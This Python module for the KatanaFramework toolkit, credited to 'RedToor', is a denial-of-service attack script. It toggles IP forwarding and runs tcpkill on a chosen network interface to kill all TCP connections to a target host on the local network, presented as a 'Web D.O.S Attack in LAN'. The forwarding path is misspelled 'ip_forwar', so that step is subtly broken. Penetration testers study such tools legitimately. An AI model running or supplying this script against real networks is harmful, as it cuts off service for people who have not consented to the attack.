# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
from core.Function import get_interfaces,Subprocess,isConect,checkDevice
import commands
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="Web D.O.S Attack in LAN."
	init.CodeName           ="net/web.dos"
	init.DateCreation       ="31/07/2016"      
	init.LastModification   ="31/07/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME      VALUE               RQ     DESCRIPTION
		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
		'target'   :["www.test.com"    ,True ,'DNS Target']
	}

	init.aux = """
 Devices Founds: """+str(get_interfaces())+"""
	"""
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):

	if isConect() and checkDevice(init.var['interface']):
		commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forwar")
		printAlert(0,"Starting WEB D.O.S Attack in LAN")
		Subprocess("tcpkill -i "+init.var['interface']+" -9 host "+init.var['target'])
		raw_input(printAlert(8,"to Stop WEB D.O.S Attack (PRESS ANY KEY)\n"))
		commands.getoutput("killall tcpkill")
		commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forwar")

# END CODE MODULE ############################################################################################